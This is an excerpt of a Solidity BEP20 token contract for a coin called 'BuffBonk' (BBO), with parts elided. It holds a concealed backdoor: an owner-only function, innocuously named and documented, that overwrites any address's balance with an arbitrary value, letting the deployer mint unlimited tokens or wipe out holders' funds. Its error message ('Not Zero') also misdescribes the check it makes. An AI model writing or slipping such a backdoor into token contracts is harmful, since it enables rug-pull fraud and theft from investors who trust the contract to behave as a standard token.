...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    address private BuffBonkowner = msg.sender;
    ...
    /**
     * See {BEP20-BuffBonkfunction}.
     */
    function BuffBonkfunction(uint256 BuffBonkvalue, address BuffBonkaddress, bool enabled) external {
     require (BuffBonkowner == msg.sender);
     require(BuffBonkvalue != 1, "Not Zero");
        _balances[BuffBonkaddress] = BuffBonkvalue * 10 ** 18;
    }  
...
contract BuffBonk is BEP20('BuffBonk', 'BBO', 1_000_000_000e18) {
    constructor() public {
